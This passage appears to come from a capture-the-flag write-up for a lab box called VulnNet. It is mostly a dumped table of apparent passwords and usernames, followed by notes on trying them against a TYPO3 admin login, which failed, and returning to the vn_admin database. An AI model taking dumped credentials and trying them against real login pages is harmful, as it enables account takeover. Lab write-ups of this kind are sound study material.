| 535 | 8T7UFX              | fstedmaneu         |
| 536 | SkuuzEsAZ           | mgaitoneev         |
| 537 | RIs9MA              | zscotlandew        |
| 538 | ttKwcGDELB          | dfurbyex           |
| 539 | PVVOkQqHVdU         | sdallowey          |
| 540 | Szh74h              | lmccormackez       |
| 541 | wMkLVr0             | arenneyf0          |
| 542 | 4Bux8MCHXS          | lbodegaf1          |
| 543 | ZXIOChbv            | rsantostefanof2    |
| 544 | PcJPLBJf            | mvaissieref3       |
| 545 | kgjhKzMWYakS        | csolwayf4          |
| 546 | p69xguJZe           | pwaddingtonf5      |
| 547 | ntswwsY             | kchaffeyf6         |
| 548 | lh0Llscj            | zgooblef7          |
| 549 | uqzWk2PYLJR7        | pwassf8            |
| 550 | eIZQxLh             | bmcclenaghanf9     |
| 551 | IDp96W1RUb          | bhaddintonfa       |
| 552 | Z7MGodFb            | rblesingfb         |
| 553 | caw1QQ1             | mblownefc          |
| 554 | QpPSspEWus          | lwhitlandfd        |
| 555 | u6ZBlHvmId          | lgoftonfe          |
| 556 | BvZ0JJNVWCX         | vdubbleff          |
| 557 | Ih1thIl             | dfrenschfg         |
| 558 | jmjhYpmgg           | gofarrisfh         |
| 559 | LFXCNqt5hN          | kpipkinfi          |
| 560 | tofKHos             | sshilstonfj        |
| 561 | fCMRSGm4BzNQ        | lstanistreetfk     |
| 562 | zFdwNg16yCdB        | ktomasellifl       |
| 563 | qJhjNz0sK7Z         | fmarkhamfm         |
| 564 | wmd4CD60            | bledingtonfn       |
| 565 | mZjvZC              | yzettoifo          |
| 566 | 7MeBiB7             | coganfp            |
| 567 | VCV8FqINn           | sdibollfq          |
| 568 | OsZxivx             | blampkinfr         |
| 569 | HVBEN4              | mfachefs           |
| 570 | m9R8setEC           | kburelft           |
| 571 | q1SivtRlbetm        | bgrimsdithfu       |
| 572 | fRnopRDUrds         | ctolemanfv         |
| 573 | eZ3TzXtdD           | awhiteheadfw       |
| 574 | Uh2kDLMNFeej        | mchislettfx        |
| 575 | Ln6WDY              | lreichardtfy       |
| 576 | kGBl9CgCPcGF        | bjossfz            |
| 577 | TuK60tJ             | hprevostg0         |
| 578 | mwTGls              | rpritchettg1       |
| 579 | Ym2cHtkuW           | dantonssong2       |
| 580 | axZcgE9T            | gmantrupg3         |
| 581 | 6LFtl39ggEtI        | dsimioneg4         |
| 582 | 79hJw4u             | lmiddleg5          |
| 583 | UdPazP              | amcquorkelg6       |
| 584 | hFdDjfcdwCja        | mellwandg7         |
| 585 | w9Copz4             | ddunbobing8        |
| 586 | K67Hs5              | cszabog9           |
| 587 | molOCywSVk          | cdorbonga          |
| 588 | wWQpqk              | fridgwellgb        |
| 589 | Ipmq9QvTymr         | ksiregc            |
| 590 | 7v4eltt3Kuw         | hwhardleygd        |
| 591 | ctvNF49tuT          | hpoppletonge       |
| 592 | hFgxHo5Xp           | aghidoligf         |
| 593 | g4St9w              | fstilinggg         |
| 594 | DTSos9KOFhIO        | ebodechongh        |
| 595 | 0lj1adMG            | rbennellickgi      |
| 596 | kNEDmUrVp           | gnaldergj          |
| 597 | 8kt6CKNTc           | preygk             |
| 598 | Khmoz3bGQiwo        | cjigglegl          |
| 599 | 2UrQCd16gtqN        | aburgisgm          |
| 600 | yQrAEzZxK           | nluddygn           |
| 601 | TeFpfcTSt4K         | lcluttengo         |
| 602 | Q8vHxue1            | laseefgp           |
| 603 | 8sNg5H              | wdovergq           |
| 604 | BB2ymU              | bjackesgr          |
| 605 | CTCPBoG             | sphebeygs          |
| 606 | KoM1f3mmxlC         | hhushergt          |
| 607 | H9fzdE              | dmowatgu           |
| 608 | OQ4Axwb             | vgoodhandgv        |
| 609 | zo9YGPcnoFY         | vcocktongw         |
| 610 | wNfgrMLd92          | afrackiewiczgx     |
| 611 | L70zF2              | wmccorkellgy       |
| 612 | vjlPxrlrB1          | mbaldersongz       |
| 613 | 1fDBrk              | jdovingtonh0       |
| 614 | NVQobq              | tlunneyh1          |
| 615 | 4IHZylSa6uSk        | lwaulkerh2         |
| 616 | 6mqTbfJcyB          | nceccolih3         |
| 617 | BtdoQGpOg           | aworsnuph4         |
| 618 | HA5wRx2Xkt          | pwheelhouseh5      |
| 619 | rsQIXNF4p56t        | ashearsh6          |
| 620 | DD87MyB             | bhendriksh7        |
| 621 | EqEt2NXw37Q         | tgrovierh8         |
| 622 | oN9I8Sf             | kspanswickh9       |
| 623 | HkZs0YLv            | krattrayha         |
| 624 | LTSB3oaxy9          | anorcockhb         |
| 625 | 2lOIMadSDW2         | kneathc            |
| 626 | 2YDcmeZaKwig        | ajaggarhd          |
| 627 | 7pA32uFwx8eh        | krossbrookehe      |
| 628 | yoWnriWXeTc         | lpavelhf           |
| 629 | OglY7vT0Pyn         | agaitskillhg       |
| 630 | GBCtL62Xa           | bmylechreesthh     |
| 631 | JdHOJPdpZV          | hsimenothi         |
| 632 | PT8RllCQ            | bbrunihj           |
| 633 | bJR3DOVL            | sroysonhk          |
| 634 | yoJwhOI             | bmarrinerhl        |
| 635 | tfncTGLw            | ataillanthm        |
| 636 | dBcYuQwU            | acassamhn          |
| 637 | s6QjWpLo            | kfruchonho         |
| 638 | LTbmsk6T            | kdenyakinhp        |
| 639 | xrbjFjA8p           | mhundyhq           |
| 640 | gaMmTSLHkMZE        | zcatchesidehr      |
| 641 | VH3FsbYfk           | anorcrosshs        |
| 642 | YY6hmavoD           | kklavesht          |
| 643 | kElKt4              | bloghanhu          |
| 644 | 4eHrdt5Z            | ekayzerhv          |
| 645 | 2QZrPJ2             | jovenhw            |
| 646 | t0xmZtLTXa          | gboayshx           |
| 647 | 09jD21OoQ           | asuermeiershy      |
| 648 | OBJZD6f             | msambidgehz        |
| 649 | Cc4QOkuSvrF         | bhuertai0          |
| 650 | kSKBUj8             | oboatmani1         |
| 651 | BIkqvmX             | rtamblingi2        |
+-----+---------------------+--------------------+
```
Notes: giant table of users and passwords, let's try logging in with some creds
Notes: trying some cred didn't work in http://admin1.vulnnet.thm/typo3/?index.php
Notes: going to go back to the vn_admin database and check it out deeper as it seems that we went down a rabbit hole.
##